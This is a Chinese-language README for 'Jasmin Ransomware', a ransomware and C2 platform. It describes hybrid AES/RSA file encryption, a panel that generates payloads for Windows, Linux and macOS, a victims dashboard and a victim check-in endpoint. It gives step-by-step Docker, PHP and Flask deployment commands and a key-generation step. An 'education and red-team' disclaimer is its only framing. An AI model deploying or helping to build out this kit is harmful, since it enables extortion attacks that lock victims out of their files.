# Jasmin Ransomware — AES+RSA 混合加密 C2 平台

> 教育与红队研究用途。请在授权范围内使用。

## 功能特性

- **AES-256 + RSA-2048 混合加密** — 每文件独立密钥，RSA保护
- **SHA256 完整性校验** — 解密后自动验证文件完整恢复
- **系统安全保护** — 加密后 Windows 可RDP / Linux 可SSH / 系统正常启动
- **全平台载荷生成** — 后台一键生成 Windows(C#)、Linux(Python)、macOS(Python) 载荷
- **双语言后台** — PHP 版 + Python Flask 版，功能完全一致
- **Docker 一键部署** — docker-compose 启动即用
- **Web 安装引导** — 4步向导自动配置数据库和管理员
- **检查更新** — 后台内置版本检查
- **MySQL 数据库** — 全部使用 MySQL 存储

---

## 快速开始

### 方式一：Docker 一键部署（推荐）

```bash
git clone https://github.com/2016xyz/Jasmin-Ransomware-Private.git
cd Jasmin-Ransomware-Private/docker
docker-compose up -d
```

| 服务 | 地址 | 说明 |
|------|------|------|
| PHP 后台 | http://localhost:8080 | 首次访问自动进入安装引导 |
| Python 后台 | http://localhost:5000 | 首次访问自动进入安装引导 |
| MySQL | localhost:3306 | 用户: jasminadmin / 密码: jasmin_secure_pw |

### 方式二：PHP 手动安装

**环境要求：** PHP 7.4+ / Apache 或 Nginx / MySQL 5.7+

```bash
# 1. 克隆代码
git clone https://github.com/2016xyz/Jasmin-Ransomware-Private.git
cd Jasmin-Ransomware-Private

# 2. 复制 PHP 后台到 Web 目录
cp -r "Web Panel"/* /var/www/html/

# 3. 设置权限
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html

# 4. 确保 MySQL 已运行
systemctl start mysqld

# 5. 访问安装引导
# 浏览器打开 http://your-server/install.php
# Step 1: 环境检测 → Step 2: 填写MySQL信息 → Step 3: 创建管理员 → 完成
```

### 方式三：Python Flask 手动安装

**环境要求：** Python 3.8+ / MySQL 5.7+

```bash
# 1. 克隆代码
git clone https://github.com/2016xyz/Jasmin-Ransomware-Private.git
cd Jasmin-Ransomware-Private/Web\ Panel\ Python

# 2. 安装依赖
pip install -r requirements.txt

# 3. 确保 MySQL 已运行
systemctl start mysqld

# 4. 启动
python app.py
# 或生产环境:
gunicorn -w 4 -b 0.0.0.0:5000 app:app

# 5. 访问安装引导
# 浏览器打开 http://your-server:5000/install
# Step 1: 环境检测 → Step 2: 填写MySQL信息 → Step 3: 创建管理员 → 完成
```

---

## 使用指南

### 生成RSA密钥对

```bash
cd KeyGen
dotnet run
# 输出: jasmin_public.pem + jasmin_private.pem
```

将公钥替换到加密器的 RSA_PUBLIC_KEY，私钥保留用于解密。

### 生成载荷

登录后台 → Payload Gen → 填写C2地址 → 选择平台 → 下载

### 检查更新

侧边栏 Updates → 检查更新 → 自动对比GitHub最新提交

---

## 项目结构

```
├── Web Panel/              # PHP 后台
│   ├── install.php         # Web安装引导
│   ├── dashboard.php       # 主面板(victims/payload/update)
│   ├── update.php          # 检查更新API
│   ├── generate.php        # 载荷生成API
│   ├── handshake.php       # 受害者回连接口
│   ├── templates/          # 载荷模板(win/linux/macos)
│   ├── includes/           # auth.php, csrf.php
│   └── database/           # db连接, SQL schema
├── Web Panel Python/       # Python Flask 后台
│   ├── app.py              # 主程序(含安装引导+更新检查)
│   ├── templates/          # Jinja2模板+载荷模板
│   ├── static/             # CSS
│   └── requirements.txt
├── Jasmin Encrypter/       # Windows加密器 (C#)
├── Jasmin Decryptor/       # Windows解密器 (C# WinForms)
├── Linux Encrypter/        # Linux加密/解密器 (Python)
├── KeyGen/                 # RSA密钥对生成工具
└── docker/                 # Docker部署
    ├── Dockerfile.php
    ├── Dockerfile.python
    └── docker-compose.yml
```

---

## 安全特性

| 特性 | 说明 |
|------|------|
| SQL注入防护 | PDO预处理(PHP) / SQLAlchemy(Python) |
| XSS防护 | htmlspecialchars / Jinja2自动转义 |
| CSRF防护 | Token验证 |
| 密码存储 | bcrypt哈希 |
| 文件下载 | realpath()白名单限制 |
| 敏感文件 | .htaccess阻止访问.env/.sql/.tpl |
| 加密完整性 | SHA256校验确保解密还原 |

## 许可

仅供教育和授权安全研究使用。
